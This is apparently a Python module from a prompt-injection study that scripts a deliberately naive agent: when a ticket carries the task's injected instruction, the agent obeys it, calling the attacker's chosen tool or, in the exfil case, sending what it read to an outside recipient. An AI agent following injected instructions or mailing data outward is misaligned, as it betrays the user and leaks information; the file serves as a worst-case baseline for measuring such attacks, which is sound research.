# SPDX-License-Identifier: BUSL-1.1
"""A scripted Study C agent for free runs: a worst-case naive agent.

It reads the ticket and follows any instruction the task's injection carries
(the attack goal), then takes the gold path and answers with what it read.
For ``exfil`` it emails what it read to the outside address after the gold
read. For ``availability`` it follows nothing. The paid agent is Study B's
``ClaudeAgent`` unchanged.
"""
from __future__ import annotations

from typing import Any

from experiments.ws1_composition.isp_study.domain import Task
from experiments.ws1_composition.study_c.tasks import OUTSIDE


def run_scripted_c(task: Task, call: Any) -> tuple[str, int]:
    ticket = call("read_ticket", {"ticket_id": task.ticket})
    answer: list[str] = []
    steps = 1
    goal = task.attack_goal if task.injection and task.injection in ticket else None
    if goal is not None and goal[0] != "send_report":
        name, args = goal
        extra = ({"profile": dict(task.gold_call[1])["profile"]}
                 if name == "set_port_profile" and "profile" not in dict(args) else {})
        answer.append(call(name, {**dict(args), **extra}))
        steps += 1
    answer.append(call("get_work_order", {"work_order_id": task.work_order}))
    name, args = task.gold_call
    answer.append(call(name, dict(args)))
    steps += 2
    if goal is not None and goal[0] == "send_report":
        call("send_report", {"recipient": OUTSIDE, "body": answer[-1]})
        steps += 1
    return " ".join(answer), steps
